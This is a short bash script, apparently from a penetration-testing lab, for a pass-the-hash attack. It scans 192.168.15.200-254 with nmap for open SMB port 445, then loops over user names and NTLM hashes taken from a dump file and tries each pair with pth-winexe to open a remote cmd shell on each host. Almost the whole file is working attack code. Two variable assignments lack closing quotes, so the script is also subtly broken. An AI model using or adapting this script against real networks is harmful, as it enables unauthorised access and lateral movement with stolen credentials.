#!/bin/bash


hashfile="/root/bin/passcrack/227/hashes"
gethash="$(awk -F: '{print $3 ":" $4}' < ${hashfile})
getuser="$(awk -F: '{print $1}' < ${hashfile})

#smbhash=$(for hash in $(awk -F: '{print $3 ":" $4}' < ${hashfile}); do 
#            smbhash=$hash
#        done
#        )
#
#smbuser=$(for user in $(awk -F: '{print $1}' < ${hashfile}); do
#            smbuser=$user
#        done
#        )

# for smbhash in $(awk -F: '{print $3 ":" $4}' < ${hashfile}); do 
# for username in $(awk -F: '{print $1}' < ${hashfile}); do 

for host in $(nmap -p 445 192.168.15.200-254 -oG - | grep open | cut -d" " -f2); do 
 #       for smbhash in $(awk -F: '{print $3 ":" $4}' < /root/bin/passcrack/227/hashes); do 
        for smbhash in $gethash; do 
         echo $smbhash

 #       for smbuser in $(awk -F: '{print $1}' < /root/bin/passcrack/227/hashes); do
        for smbuser in $getuser; do
         echo $smbuser

       echo "[+]"
        echo "[+] trying $smbuser@$host with $smbhash"
        echo "[+]"
#      gethash
#      getuser
        pth-winexe -U $smbuser%$smbhash //$host cmd; 
    done
  done
done
